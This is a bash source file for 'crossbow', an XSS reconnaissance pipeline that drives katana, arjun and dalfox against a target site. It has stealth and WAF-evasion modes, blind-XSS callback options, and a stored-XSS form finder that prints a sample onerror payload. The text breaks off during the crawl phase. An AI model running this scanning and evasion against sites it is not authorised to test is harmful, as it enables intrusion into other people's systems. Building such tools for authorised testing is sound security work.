#!/bin/bash
# crossbow — XSS recon pipeline: katana → arjun → dalfox
# https://github.com/YOUR_USERNAME/crossbow
set -uo pipefail

VERSION="1.0.0"

# ── Colors & Symbols ───────────────────────────────────────────
setup_colors() {
    if [[ -t 1 || -n "${CROSSBOW_FORCE_COLOR:-}" ]] && [[ -z "${NO_COLOR:-}" ]]; then
        RED='\033[0;31m'    GREEN='\033[0;32m'
        YELLOW='\033[0;33m' BLUE='\033[0;34m'
        CYAN='\033[0;36m'   BOLD='\033[1m'
        DIM='\033[2m'       RESET='\033[0m'
    else
        RED='' GREEN='' YELLOW='' BLUE='' CYAN='' BOLD='' DIM='' RESET=''
    fi
}

log_info()    { echo -e "${BLUE}[*]${RESET} $*" >&2; }
log_ok()      { echo -e "${GREEN}[+]${RESET} $*" >&2; }
log_warn()    { echo -e "${YELLOW}[!]${RESET} $*" >&2; }
log_err()     { echo -e "${RED}[-]${RESET} $*" >&2; }
log_phase()   { echo -e "\n${BOLD}${CYAN}>>> $*${RESET}" >&2; }

elapsed() {
    local s=$(( SECONDS - $1 ))
    if (( s >= 60 )); then printf "%dm %ds" $((s/60)) $((s%60))
    else printf "%ds" "$s"; fi
}

# ── Banner ─────────────────────────────────────────────────────
banner() {
    [[ "${QUIET:-0}" -eq 1 ]] && return
    echo -e "${DIM}   \\\\\\\\     //${RESET}"
    echo -e "${DIM}    \\\\\\\\${BOLD}═══${DIM}//${RESET}"
    echo -e "${BOLD} ════╬═●═╬════►${RESET}  ${CYAN}crossbow${RESET} ${DIM}v${VERSION}${RESET}"
    echo -e "${DIM}    //${BOLD}═══${DIM}\\\\\\\\${RESET}"
    echo -e "${DIM}   //     \\\\\\\\${RESET}     ${DIM}katana + arjun + dalfox${RESET}"
    echo ""
}

# ── Dependency Check ───────────────────────────────────────────
check_deps() {
    local missing=0
    for cmd in katana arjun dalfox python3 wafw00f; do
        if command -v "$cmd" &>/dev/null; then
            local ver
            case "$cmd" in
                katana)  ver=$(katana -version 2>&1 | grep -oP 'v[\d.]+' | head -1) ;;
                arjun)   ver=$(pipx list 2>/dev/null | grep -oP 'arjun \K[\d.]+' || echo "?") ;;
                dalfox)  ver=$(dalfox --version 2>&1 | head -1) ;;
                python3) ver=$(python3 --version 2>&1) ;;
                wafw00f) ver=$(wafw00f -V 2>&1 | sed 's/\x1b\[[0-9;]*m//g' | grep -oP 'v[\d.]+' | head -1) ;;
            esac
            log_ok "$cmd ${DIM}($ver)${RESET}"
        else
            log_err "$cmd not found"
            missing=1
        fi
    done
    [[ $missing -eq 1 ]] && { log_err "Install missing tools first."; exit 1; }
}

# ── Usage ──────────────────────────────────────────────────────
usage() {
    banner
    cat <<'EOF'
USAGE
    crossbow -t <url> [options]

TARGET
    -u, --target <url>        Target URL (required)
    -H, --headers <val>       Header string or file (repeatable)
                              e.g. -H "Cookie: ..." or -H headers.txt

PROFILES
    --quick                   Fast scan: shallow crawl, small wordlist
    --standard                Balanced (default)
    --deep                    Thorough: headless crawl, all encoders, deep scan
    --stealth                 Low & slow: rate-limited, WAF-friendly
    --sonic                   Max speed: parallel phases, high concurrency, no waiting
    --all                     Run all profiles (quick+standard+deep+sonic), merge results

FEATURES
    --blind <url>             Blind XSS callback URL
    --oob                     Enable interactsh OOB for blind XSS
    --sxss <url>              Stored XSS — check this URL for reflection
    --proxy <url>             Proxy for all tools (http/socks5)
    --waf                     Enable WAF evasion across pipeline
    --passive                 Enable arjun passive recon (wayback/commoncrawl)
    --stored                  Probe for stored XSS (submit+verify on render pages)

PHASE CONTROL
    --skip-crawl              Skip katana crawl phase
    --skip-arjun              Skip arjun discovery phase
    --skip-scan               Skip dalfox scan phase
    --crawl-file <file>       Use existing URL list instead of crawling

OUTPUT
    -o, --output-dir <dir>    Output directory (default: auto-generated)
    -f, --format <fmt>        Dalfox format: plain|json|jsonl|sarif|markdown
    -T, --threads <n>         Parallel arjun instances + dalfox target concurrency
                              (default: auto per profile — quick:4, standard:3, deep:2, stealth:1)
    --no-color                Disable colored output
    -q, --quiet               Minimal output (no banner)
    -vv, --verbose            Verbose: show full tool output + dalfox debug

MISC
    -h, --help                Show this help
    -v, --version             Show version

EXAMPLES
    crossbow -u https://target.com -H cookies.txt
    crossbow -u https://target.com --deep --passive --oob
    crossbow -u https://target.com --stealth --waf --proxy http://127.0.0.1:8080
    crossbow -u https://target.com --skip-crawl --crawl-file urls.txt -f json
EOF
    exit 0
}

# ── Profile Configuration ─────────────────────────────────────
apply_profile() {
    case "${PROFILE}" in
        quick)
            KAT_DEPTH=2   KAT_JS=0  KAT_HL=0  KAT_KF=0  KAT_CONC=15  KAT_RL=150
            KAT_EXTRA=""
            ARJ_WL="small"  ARJ_PASS=${PASSIVE:-0}  ARJ_THR=10  ARJ_CHK=250  ARJ_DLY=0  ARJ_TIMEOUT=60
            ARJ_EXTRA=""
            DFX_WRK=20  DFX_DEEP=0  DFX_EXTJS=0  DFX_HPP=0  DFX_LIBS=0
            DFX_REMOTE=""  DFX_ENC="url,html"  DFX_RL=0  DFX_DLY=0
            DFX_EXTRA=""
            ;;
        standard)
            KAT_DEPTH=3   KAT_JS=1  KAT_HL=0  KAT_KF=1  KAT_CONC=10  KAT_RL=150
            KAT_EXTRA="-td"
            ARJ_WL="large"  ARJ_PASS=${PASSIVE:-0}  ARJ_THR=5  ARJ_CHK=250  ARJ_DLY=0  ARJ_TIMEOUT=120
            ARJ_EXTRA=""
            DFX_WRK=30  DFX_DEEP=0  DFX_EXTJS=0  DFX_HPP=0  DFX_LIBS=0
            DFX_REMOTE=""  DFX_ENC="url,html"  DFX_RL=0  DFX_DLY=0
            DFX_EXTRA=""
            ;;
        deep)
            KAT_DEPTH=5   KAT_JS=1  KAT_HL=0  KAT_KF=1  KAT_CONC=30  KAT_RL=0
            KAT_EXTRA="-td -jsl -aff"
            ARJ_WL="medium"  ARJ_PASS=1  ARJ_THR=15  ARJ_CHK=500  ARJ_DLY=0  ARJ_TIMEOUT=180
            ARJ_EXTRA=""
            DFX_WRK=50  DFX_DEEP=0  DFX_EXTJS=1  DFX_HPP=1  DFX_LIBS=1
            DFX_REMOTE="portswigger,payloadbox"  DFX_ENC="url,html"
            DFX_RL=0  DFX_DLY=0
            DFX_EXTRA="--follow-redirects --max-payloads-per-param 500 --scan-timeout 60"
            ;;
        stealth)
            KAT_DEPTH=3   KAT_JS=1  KAT_HL=0  KAT_KF=0  KAT_CONC=3  KAT_RL=5
            KAT_EXTRA="-td"
            ARJ_WL="medium"  ARJ_PASS=1  ARJ_THR=1  ARJ_CHK=100  ARJ_DLY=2  ARJ_TIMEOUT=300
            ARJ_EXTRA="--stable"
            DFX_WRK=5  DFX_DEEP=0  DFX_EXTJS=0  DFX_HPP=0  DFX_LIBS=0
            DFX_REMOTE=""  DFX_ENC="url,html"  DFX_RL=5  DFX_DLY=500
            DFX_EXTRA="--waf-evasion --follow-redirects"
            ;;
        sonic)
            KAT_DEPTH=2   KAT_JS=1  KAT_HL=0  KAT_KF=0  KAT_CONC=50  KAT_RL=0
            KAT_EXTRA=""
            ARJ_WL="small"  ARJ_PASS=0  ARJ_THR=15  ARJ_CHK=500  ARJ_DLY=0  ARJ_TIMEOUT=45
            ARJ_EXTRA=""
            DFX_WRK=100  DFX_DEEP=0  DFX_EXTJS=0  DFX_HPP=0  DFX_LIBS=0
            DFX_REMOTE=""  DFX_ENC="url"  DFX_RL=0  DFX_DLY=0
            DFX_EXTRA="--skip-mining --skip-waf-probe --skip-reflection-header --skip-reflection-cookie --timeout 5 --scan-timeout 30 --max-payloads-per-param 200"
            SONIC=1
            ;;
    esac

    # Thread defaults per profile (0 = use these defaults)
    case "${PROFILE}" in
        quick)    DEF_THREADS=4 ;;
        standard) DEF_THREADS=3 ;;
        deep)     DEF_THREADS=4 ;;
        stealth)  DEF_THREADS=1 ;;
        sonic)    DEF_THREADS=8 ;;
    esac
    [[ $THREADS -eq 0 ]] && THREADS=$DEF_THREADS

    # WAF overlay
    if [[ "${WAF:-0}" -eq 1 ]]; then
        KAT_EXTRA+=" -tlsi"
        ARJ_EXTRA+=" --stable"
        DFX_EXTRA+=" --waf-evasion --hpp"
        (( DFX_WRK > 15 )) && DFX_WRK=15
    fi
}

# ── Header Builder ─────────────────────────────────────────────
add_header() {
    local h="$1"
    KATANA_H+=(-H "$h")
    DALFOX_H+=(-H "$h")
    [[ -n "$ARJUN_H" ]] && ARJUN_H+="\\n"
    ARJUN_H+="$h"
}

build_headers() {
    KATANA_H=()  DALFOX_H=()  ARJUN_H=""
    for entry in "${HEADER_ARGS[@]}"; do
        if [[ -f "$entry" ]]; then
            while IFS= read -r line || [[ -n "$line" ]]; do
                [[ -z "$line" || "$line" =~ ^# ]] && continue
                add_header "$line"
            done < "$entry"
        else
            add_header "$entry"
        fi
    done
}

# ── Signal Handler ─────────────────────────────────────────────
cleanup() {
    echo "" >&2
    log_warn "Interrupted — partial results in: ${OUTDIR:-/tmp}"
    exit 130
}
trap cleanup SIGINT SIGTERM

# ── CLI Parsing ────────────────────────────────────────────────
TARGET=""  HEADER_ARGS=()  PROFILE="standard"
BLIND_URL=""  OOB=0  SXSS_URL=""  PROXY=""  WAF=0  PASSIVE=0
OUTDIR=""  FORMAT="plain"  QUIET=0  VERBOSE=0  NO_COLOR=""  THREADS=0  SONIC=0
SKIP_CRAWL=0  SKIP_ARJUN=0  SKIP_SCAN=0  CRAWL_FILE=""  ALL=0  STORED=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        -u|--target)        TARGET="$2"; shift 2 ;;
        --target=*)         TARGET="${1#*=}"; shift ;;
        -H|--headers)       HEADER_ARGS+=("$2"); shift 2 ;;
        --headers=*)        HEADER_ARGS+=("${1#*=}"); shift ;;
        --quick)            PROFILE="quick"; shift ;;
        --standard)         PROFILE="standard"; shift ;;
        --deep)             PROFILE="deep"; shift ;;
        --stealth)          PROFILE="stealth"; shift ;;
        --sonic)            PROFILE="sonic"; shift ;;
        --all)              ALL=1; shift ;;
        --blind)            BLIND_URL="$2"; shift 2 ;;
        --blind=*)          BLIND_URL="${1#*=}"; shift ;;
        --oob)              OOB=1; shift ;;
        --sxss)             SXSS_URL="$2"; shift 2 ;;
        --sxss=*)           SXSS_URL="${1#*=}"; shift ;;
        --proxy)            PROXY="$2"; shift 2 ;;
        --proxy=*)          PROXY="${1#*=}"; shift ;;
        --waf)              WAF=1; shift ;;
        --passive)          PASSIVE=1; shift ;;
        --stored)           STORED=1; shift ;;
        -o|--output-dir)    OUTDIR="$2"; shift 2 ;;
        --output-dir=*)     OUTDIR="${1#*=}"; shift ;;
        -f|--format)        FORMAT="$2"; shift 2 ;;
        --format=*)         FORMAT="${1#*=}"; shift ;;
        --skip-crawl)       SKIP_CRAWL=1; shift ;;
        --skip-arjun)       SKIP_ARJUN=1; shift ;;
        --skip-scan)        SKIP_SCAN=1; shift ;;
        --crawl-file)       CRAWL_FILE="$2"; SKIP_CRAWL=1; shift 2 ;;
        --crawl-file=*)     CRAWL_FILE="${1#*=}"; SKIP_CRAWL=1; shift ;;
        -T|--threads)       THREADS="$2"; shift 2 ;;
        --threads=*)        THREADS="${1#*=}"; shift ;;
        --no-color)         NO_COLOR=1; shift ;;
        -q|--quiet)         QUIET=1; shift ;;
        -vv|--verbose)      VERBOSE=1; shift ;;
        -h|--help)          setup_colors; usage ;;
        -v|--version)       echo "crossbow v${VERSION}"; exit 0 ;;
        *)                  log_err "Unknown flag: $1"; echo "Run 'crossbow --help'" >&2; exit 1 ;;
    esac
done

# ── Init ───────────────────────────────────────────────────────
setup_colors
banner

[[ -z "$TARGET" ]] && { log_err "Target required. Use -u <url>"; exit 1; }
[[ "$TARGET" =~ ^https?:// ]] || { log_err "Target must start with http:// or https://"; exit 1; }

TARGET_HOST=$(echo "$TARGET" | sed 's|https\?://||;s|[/:?#].*||')

# ── Connectivity check: detect scheme mismatch ───────────────
if ! curl -sk --head --max-time 5 "$TARGET" -o /dev/null 2>/dev/null; then
    if [[ "$TARGET" =~ ^http:// ]]; then
        ALT="${TARGET/http:\/\//https:\/\/}"
    else
        ALT="${TARGET/https:\/\//http:\/\/}"
    fi
    if curl -sk --head --max-time 5 "$ALT" -o /dev/null 2>/dev/null; then
        log_warn "Target unreachable at $TARGET — switching to $ALT"
        TARGET="$ALT"
        TARGET_HOST=$(echo "$TARGET" | sed 's|https\?://||;s|[/:?#].*||')
    else
        log_err "Target unreachable at both $TARGET and $ALT"
        exit 1
    fi
fi

case "$FORMAT" in
    plain)    FMT_EXT="txt" ;;
    json)     FMT_EXT="json" ;;
    jsonl)    FMT_EXT="jsonl" ;;
    sarif)    FMT_EXT="sarif.json" ;;
    markdown) FMT_EXT="md" ;;
    *)        log_err "Invalid format: $FORMAT (use plain|json|jsonl|sarif|markdown)"; exit 1 ;;
esac

if [[ $SKIP_CRAWL -eq 1 && -z "$CRAWL_FILE" && $SKIP_ARJUN -eq 0 ]]; then
    log_err "Cannot skip crawl without --crawl-file (arjun needs URLs)"
    exit 1
fi

if [[ -n "$CRAWL_FILE" && ! -f "$CRAWL_FILE" ]]; then
    log_err "Crawl file not found: $CRAWL_FILE"; exit 1
fi

if [[ -z "$OUTDIR" ]]; then
    SLUG=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||;s|:|-|g')
    OUTDIR="$HOME/.crossbow/$(date +%Y%m%d_%H%M%S)_${SLUG}"
fi
mkdir -p "$OUTDIR"

apply_profile
build_headers
check_deps

# ── WAF detection (wafw00f) ───────────────────────────────────
WAF_JSON=$(wafw00f "$TARGET" ${PROXY:+-p "$PROXY"} -o - -f json 2>/dev/null || true)
WAF_DETECTED=$(echo "$WAF_JSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d[0].get('firewall','None') if d[0].get('detected') else '')" 2>/dev/null || true)
WAF_VENDOR=$(echo "$WAF_JSON" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d[0].get('manufacturer','') if d[0].get('detected') else '')" 2>/dev/null || true)
echo "$WAF_JSON" > "$OUTDIR/wafw00f.json" 2>/dev/null

if [[ -n "$WAF_DETECTED" ]]; then
    WAF_LABEL="$WAF_DETECTED"
    [[ -n "$WAF_VENDOR" && "$WAF_VENDOR" != "None" ]] && WAF_LABEL+=" ($WAF_VENDOR)"
    if [[ "${WAF:-0}" -eq 1 ]]; then
        log_warn "WAF detected: ${BOLD}$WAF_LABEL${RESET} ${DIM}(--waf already enabled)${RESET}"
    elif [[ -t 0 ]]; then
        log_warn "WAF detected: ${BOLD}$WAF_LABEL${RESET}"
        printf "    Enable WAF evasion mode? [Y/n] " >&2
        read -r WAF_REPLY < /dev/tty 2>/dev/null || WAF_REPLY=""
        if [[ -z "$WAF_REPLY" || "$WAF_REPLY" =~ ^[Yy] ]]; then
            WAF=1
            KAT_EXTRA+=" -tlsi"
            ARJ_EXTRA+=" --stable"
            DFX_EXTRA+=" --waf-evasion --hpp"
            (( DFX_WRK > 15 )) && DFX_WRK=15
            log_ok "WAF evasion enabled"
        fi
    else
        log_warn "WAF detected: ${BOLD}$WAF_LABEL${RESET} ${DIM}(use --waf to enable evasion)${RESET}"
    fi
else
    log_ok "No WAF detected"
fi

[[ ${#HEADER_ARGS[@]} -eq 0 ]] && log_warn "No headers set (-H) — target may require authentication"

# ── --all: run all profiles and merge ─────────────────────────
if [[ $ALL -eq 1 ]]; then
    TOTAL_START=$SECONDS
    log_info "Target  : ${BOLD}$TARGET${RESET}"
    log_info "Mode    : ${BOLD}ALL${RESET}  ${DIM}(quick → standard → deep → sonic)${RESET}"
    log_info "Output  : ${DIM}$OUTDIR${RESET}"
    echo "" >&2

    PASSTHROUGH=(-u "$TARGET")
    for h in "${HEADER_ARGS[@]}"; do PASSTHROUGH+=(-H "$h"); done
    [[ -n "$BLIND_URL" ]] && PASSTHROUGH+=(--blind "$BLIND_URL")
    [[ $OOB -eq 1 ]] && PASSTHROUGH+=(--oob)
    [[ -n "$SXSS_URL" ]] && PASSTHROUGH+=(--sxss "$SXSS_URL")
    [[ -n "$PROXY" ]] && PASSTHROUGH+=(--proxy "$PROXY")
    [[ $WAF -eq 1 ]] && PASSTHROUGH+=(--waf)
    [[ $PASSIVE -eq 1 ]] && PASSTHROUGH+=(--passive)
    [[ $STORED -eq 1 ]] && PASSTHROUGH+=(--stored)
    [[ "$FORMAT" != "plain" ]] && PASSTHROUGH+=(-f "$FORMAT")
    [[ $SKIP_CRAWL -eq 1 ]] && PASSTHROUGH+=(--skip-crawl)
    [[ $SKIP_ARJUN -eq 1 ]] && PASSTHROUGH+=(--skip-arjun)
    [[ $SKIP_SCAN -eq 1 ]] && PASSTHROUGH+=(--skip-scan)
    [[ -n "$CRAWL_FILE" ]] && PASSTHROUGH+=(--crawl-file "$CRAWL_FILE")
    [[ $VERBOSE -eq 1 ]] && PASSTHROUGH+=(--verbose)
    [[ $QUIET -eq 1 ]] && PASSTHROUGH+=(-q)
    [[ -n "$NO_COLOR" ]] && PASSTHROUGH+=(--no-color)
    [[ $THREADS -ne 0 ]] && PASSTHROUGH+=(-T "$THREADS")

    ALL_PROFILES=(quick standard deep sonic)
    declare -A PROF_V PROF_R PROF_A PROF_CB PROF_TIME

    for prof in "${ALL_PROFILES[@]}"; do
        log_phase "═══ Profile: $prof ═══"
        PROF_START=$SECONDS
        mkdir -p "$OUTDIR/$prof"

        CROSSBOW_FORCE_COLOR=1 "$0" "${PASSTHROUGH[@]}" "--$prof" -o "$OUTDIR/$prof" 2>&1 | tail -n +2

        local_v=0 local_r=0 local_a=0 local_cb=0
        if [[ -s "$OUTDIR/$prof/results.${FMT_EXT}" && "$FORMAT" == "plain" ]]; then
            local_v=$(grep -c '\[POC\]\[V\]' "$OUTDIR/$prof/results.${FMT_EXT}" 2>/dev/null || true)
            local_r=$(grep -c '\[POC\]\[R\]' "$OUTDIR/$prof/results.${FMT_EXT}" 2>/dev/null || true)
            local_a=$(grep -c '\[POC\]\[A\]' "$OUTDIR/$prof/results.${FMT_EXT}" 2>/dev/null || true)
            local_cb=$(grep -c '\[CB\]\[V\]' "$OUTDIR/$prof/results.${FMT_EXT}" 2>/dev/null || true)
        fi
        PROF_V[$prof]=$local_v
        PROF_R[$prof]=$local_r
        PROF_A[$prof]=$local_a
        PROF_CB[$prof]=$local_cb
        PROF_TIME[$prof]=$(elapsed $PROF_START)
    done

    # Merge crawled URLs
    cat "$OUTDIR"/*/crawled.txt 2>/dev/null | sort -u > "$OUTDIR/merged_crawled.txt"
    MERGED_URLS=$(wc -l < "$OUTDIR/merged_crawled.txt" 2>/dev/null || echo 0)

    # Merge and deduplicate results
    MERGED_FILE="$OUTDIR/merged_results.${FMT_EXT}"
    if [[ "$FORMAT" == "plain" ]]; then
        python3 << 'PYEOF' - "$OUTDIR" "$MERGED_FILE" "${ALL_PROFILES[@]}"
import re, sys, os
from urllib.parse import urlparse, parse_qs

outdir = sys.argv[1]
merged_file = sys.argv[2]
profiles = sys.argv[3:]

ansi = re.compile(r'\x1b\[[0-9;]*m')

priority = {'[CB][V]': 4, '[POC][V]': 3, '[POC][A]': 2, '[POC][R]': 1}

def get_tag(line):
    clean = ansi.sub('', line)
    if '[CB][V]' in clean: return '[CB][V]'
    if '[POC][V]' in clean: return '[POC][V]'
    if '[POC][A]' in clean: return '[POC][A]'
    if '[POC][R]' in clean: return '[POC][R]'
    return None

def get_key(block):
    clean = ansi.sub('', block)
    url_m = re.search(r'https?://\S+', clean)
    if not url_m:
        return None
    url = url_m.group(0).strip()
    parsed = urlparse(url)
    params = sorted(parse_qs(parsed.query, keep_blank_values=True).keys())
    return f"{parsed.scheme}://{parsed.netloc}{parsed.path}|{'&'.join(params)}"

findings = {}

for prof in profiles:
    results_path = None
    for ext in ['txt', 'json', 'jsonl', 'sarif.json', 'md']:
        p = os.path.join(outdir, prof, f'results.{ext}')
        if os.path.isfile(p) and os.path.getsize(p) > 0:
            results_path = p
            break
    if not results_path:
        continue

    with open(results_path) as f:
        content = f.read()

    blocks = re.split(r'(?=\[POC\]|\[CB\])', content)
    for block in blocks:
        block = block.strip()
        if not block:
            continue
        first_line = block.split('\n')[0]
        tag = get_tag(first_line)
        if not tag:
            continue
        key = get_key(block)
        if not key:
            continue
        prio = priority.get(tag, 0)
        if key not in findings or prio > findings[key][0]:
            findings[key] = (prio, block, prof)

# Also grab recheck sections
for prof in profiles:
    p = os.path.join(outdir, prof, 'results.txt')
    if not os.path.isfile(p):
        continue
    with open(p) as f:
        content = f.read()
    clean = ansi.sub('', content)
    cb_blocks = re.split(r'(?=⚡ \[CB\])', content)
    for block in cb_blocks:
        block = block.strip()
        if not block.startswith('⚡') and not ansi.sub('', block).startswith('⚡'):
            continue
        key = get_key(block)
        if not key:
            continue
        prio = priority.get('[CB][V]', 4)
        if key not in findings or prio > findings[key][0]:
            findings[key] = (prio, block, prof)

with open(merged_file, 'w') as f:
    sorted_findings = sorted(findings.values(), key=lambda x: -x[0])
    for prio, block, prof in sorted_findings:
        f.write(f'{block}\n\n')
PYEOF
    else
        cat "$OUTDIR"/*/results.${FMT_EXT} 2>/dev/null > "$MERGED_FILE"
    fi

    # Stored XSS on merged crawled URLs
    SXSS_FILE="$OUTDIR/stored_xss_candidates.txt"
    SXSS_COUNT=0
    if [[ $STORED -eq 1 && -s "$OUTDIR/merged_crawled.txt" ]]; then
        python3 << 'PYEOF' - "$OUTDIR/merged_crawled.txt" "$SXSS_FILE" "${DALFOX_H[1]:-}"
import sys, re, urllib.request, urllib.error, urllib.parse, ssl

crawled_file = sys.argv[1]
output_file = sys.argv[2]
header = sys.argv[3] if len(sys.argv) > 3 and sys.argv[3] else None

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

text_types = {'text', 'search', 'url', 'email', 'tel', 'number', ''}
skip_names = {'csrf', 'token', '_token', 'csrfmiddlewaretoken', 'authenticity_token', '__requestverificationtoken'}
skip_actions = {'login', 'logout', 'signin', 'signout', 'register', 'signup', 'reset', 'forgot', 'settings', 'password', 'reset-password', 'forgot-password'}

def fetch(url):
    try:
        req = urllib.request.Request(url)
        if header:
            k, v = header.split(':', 1)
            req.add_header(k.strip(), v.strip())
        resp = urllib.request.urlopen(req, timeout=8, context=ctx)
        return resp.read().decode('utf-8', errors='replace')
    except Exception:
        return ''

with open(crawled_file) as f:
    crawled = sorted(set(l.strip().split('?')[0] for l in f if l.strip()))

parsed = urllib.parse.urlparse(crawled[0]) if crawled else None
base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed else ''

all_urls = set(crawled)
to_visit = list(crawled)
for depth in range(2):
    new_found = []
    for url in to_visit:
        html = fetch(url)
        if not html:
            continue
        for href in re.findall(r'href="([^"#]*)"', html, re.IGNORECASE):
            full = urllib.parse.urljoin(url, href).split('?')[0].split('#')[0]
            if full.startswith(base_url) and full not in all_urls:
                all_urls.add(full)
                new_found.append(full)
    to_visit = new_found

all_urls = sorted(all_urls)
candidates = []
seen = set()

for url in all_urls:
    html = fetch(url)
    if not html:
        continue
    forms = re.finditer(r'<form\b[^>]*>(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
    for fm in forms:
        form_tag = fm.group(0)
        form_head = re.match(r'<form\b[^>]*>', form_tag, re.IGNORECASE).group(0)
        method = re.search(r'method=["\']?(\w+)', form_head, re.IGNORECASE)
        method = method.group(1).upper() if method else 'GET'
        if method != 'POST':
            continue
        action = re.search(r'action=["\']([^"\']*)', form_head, re.IGNORECASE)
        action = action.group(1) if action else url
        body = fm.group(1)
        fields = []
        select_fields = []
        for inp in re.finditer(r'<input\b[^>]*>', body, re.IGNORECASE):
            tag = inp.group(0)
            itype = re.search(r'type=["\']?(\w+)', tag, re.IGNORECASE)
            itype = itype.group(1).lower() if itype else ''
            if itype in ('hidden', 'submit', 'button', 'file'):
                continue
            iname = re.search(r'name=["\']([^"\']*)', tag, re.IGNORECASE)
            if not iname:
                continue
            name = iname.group(1)
            if name.lower() in skip_names:
                continue
            if itype in text_types:
                fields.append((name, 'input', itype or 'text'))
        for ta in re.finditer(r'<textarea\b[^>]*name=["\']([^"\']*)[^>]*>', body, re.IGNORECASE):
            name = ta.group(1)
            if name.lower() not in skip_names:
                fields.append((name, 'textarea', ''))
        for sel in re.finditer(r'<select\b[^>]*name=["\']([^"\']*)[^>]*>(.*?)</select>', body, re.DOTALL | re.IGNORECASE):
            sname = sel.group(1)
            opts = re.findall(r'value=["\']([^"\']*)', sel.group(2))
            select_fields.append((sname, opts))
        if not fields:
            continue
        action_path = action.rstrip('/').rsplit('/', 1)[-1].lower()
        if action_path in skip_actions:
            continue
        key = (url, action, tuple(f[0] for f in fields))
        if key not in seen:
            seen.add(key)
            candidates.append((url, action, method, fields, select_fields))

if candidates:
    with open(output_file, 'w') as f:
        f.write("Stored XSS Candidates — Manual Testing Required\n")
        f.write("=" * 50 + "\n\n")
        f.write("These POST forms accept text input that may be stored\n")
        f.write("and rendered elsewhere. Test each with a unique payload\n")
        f.write("(e.g. <img src=x onerror=alert('FORMNAME')>) and check\n")
        f.write("where the value appears on other pages.\n\n")
        for url, action, method, fields, selects in candidates:
            f.write(f"Page    : {url}\n")
            f.write(f"Action  : {action}\n")
            f.write(f"Method  : {method}\n")
            for name, tag, itype in fields:
                label = tag
                if itype:
                    label = f"{tag} type={itype}"
                f.write(f"  Field : {name} ({label})\n")
            for sname, opts in selects:
                f.write(f"  Select: {sname} (options={','.join(opts[:5])})\n")
            f.write("\n")
PYEOF
        [[ -s "$SXSS_FILE" ]] && SXSS_COUNT=$(grep -c '^Page' "$SXSS_FILE" 2>/dev/null || true)
    fi

    # CB recheck on merged results
    if [[ -s "$MERGED_FILE" && "$FORMAT" == "plain" ]]; then
        recheck_interaction_findings "$MERGED_FILE"
    fi

    # Count merged findings
    MV=0 MR=0 MA=0 MCB=0
    if [[ -s "$MERGED_FILE" && "$FORMAT" == "plain" ]]; then
        MV=$(grep -c '\[POC\]\[V\]' "$MERGED_FILE" 2>/dev/null || true)
        MR=$(grep -c '\[POC\]\[R\]' "$MERGED_FILE" 2>/dev/null || true)
        MA=$(grep -c '\[POC\]\[A\]' "$MERGED_FILE" 2>/dev/null || true)
        MCB=$(grep -c '\[CB\]\[V\]' "$MERGED_FILE" 2>/dev/null || true)
    fi

    TOTAL_TIME=$(elapsed $TOTAL_START)

    echo "" >&2
    echo -e "${BOLD}══════════════════════════════════════════${RESET}" >&2
    echo -e "${BOLD}  ALL PROFILES COMPLETE${RESET}" >&2
    echo -e "──────────────────────────────────────────" >&2
    echo -e "  Target  : ${BOLD}$TARGET${RESET}" >&2
    echo -e "  Time    : $TOTAL_TIME" >&2
    echo -e "" >&2
    for prof in "${ALL_PROFILES[@]}"; do
        printf "  %-10s: %2dV %2dR %2dA" "$prof" "${PROF_V[$prof]}" "${PROF_R[$prof]}" "${PROF_A[$prof]}" >&2
        [[ ${PROF_CB[$prof]} -gt 0 ]] && printf " %2dCB" "${PROF_CB[$prof]}" >&2
        printf "  ${DIM}(%s)${RESET}\n" "${PROF_TIME[$prof]}" >&2
    done
    echo -e "" >&2
    echo -e "  ${BOLD}MERGED (deduplicated):${RESET}" >&2
    [[ $MV -gt 0 ]] && MVC="${RED}${BOLD}$MV${RESET}" || MVC="$MV"
    [[ $MR -gt 0 ]] && MRC="${YELLOW}$MR${RESET}" || MRC="$MR"
    [[ $MA -gt 0 ]] && MAC="${CYAN}$MA${RESET}" || MAC="$MA"
    echo -e "  ${RED}[V]${RESET} Verified  : $MVC" >&2
    echo -e "  ${YELLOW}[R]${RESET} Reflected : $MRC" >&2
    echo -e "  ${CYAN}[A]${RESET} DOM (AST) : $MAC" >&2
    if [[ $MCB -gt 0 ]]; then
        echo -e "  ${GREEN}[CB]${RESET} Tag-break : ${GREEN}${BOLD}$MCB${RESET}  ${DIM}(crossbow recheck)${RESET}" >&2
    fi
    echo -e "" >&2
    echo -e "  Merged URLs : ${DIM}$MERGED_URLS${RESET}" >&2
    echo -e "  Results     : ${DIM}$MERGED_FILE${RESET}" >&2
    if [[ $SXSS_COUNT -gt 0 ]]; then
        echo -e "  Stored XSS  : ${DIM}$SXSS_FILE${RESET}  ${DIM}($SXSS_COUNT candidates)${RESET}" >&2
    fi
    echo -e "  Output      : ${DIM}$OUTDIR${RESET}" >&2
    echo -e "${BOLD}══════════════════════════════════════════${RESET}" >&2
    exit 0
fi

TOTAL_START=$SECONDS
log_info "Target  : ${BOLD}$TARGET${RESET}"
log_info "Profile : ${BOLD}$PROFILE${RESET}  ${DIM}(threads: $THREADS)${RESET}"
log_info "Output  : ${DIM}$OUTDIR${RESET}"

# ── Phase 1: Crawl ────────────────────────────────────────────
CRAWL_COUNT=0
if [[ $SKIP_CRAWL -eq 0 ]]; then
    log_phase "Phase 1/3 — Crawl (katana)"
    P1=$SECONDS

    CMD=(katana -u "$TARGET" -d "$KAT_DEPTH" -c "$KAT_CONC" -rl "$KAT_RL"
         -ef "png,jpg,jpeg,gif,svg,css,woff,woff2,ttf,eot,ico,mp4,mp3,pdf,zip,tar,gz"
         -iqp -fsu)
    [[ $VERBOSE -eq 0 ]] && CMD+=(-silent)

    [[ $KAT_JS  -eq 1 ]] && CMD+=(-jc)
    [[ $KAT_HL  -eq 1 ]] && CMD+=(-hl -nos)
    [[ $KAT_KF  -eq 1 ]] && CMD+=(-kf all)
    [[ -n "$PROXY" ]] && CMD+=(-proxy "$PROXY")
    [[ -n "$KAT_EXTRA" ]] && { read -ra _x <<< "$KAT_EXTRA"; CMD+=("${_x[@]}"); }
    CMD+=("${KATANA_H[@]}")

    "${CMD[@]}" 2>/dev/null | grep -F "$TARGET_HOST" | sort -u > "$OUTDIR/crawled.txt"

